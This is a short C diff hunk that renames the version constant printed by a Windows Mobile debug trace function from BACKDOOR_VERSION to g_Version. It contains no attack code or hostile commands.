@@ -409,7 +409,7 @@ void DebugTraceVersion() {
 
 	ovi.dwOSVersionInfoSize = sizeof(OSVERSIONINFO);
 
-	wsprintf(wVersion, L"WinMobile Core Version: %d\n", BACKDOOR_VERSION);
+	wsprintf(wVersion, L"WinMobile Core Version: %d\n", g_Version);
 	DBG_TRACE(wVersion, 1, FALSE);
 
 	if (GetVersionEx(&ovi) == FALSE)
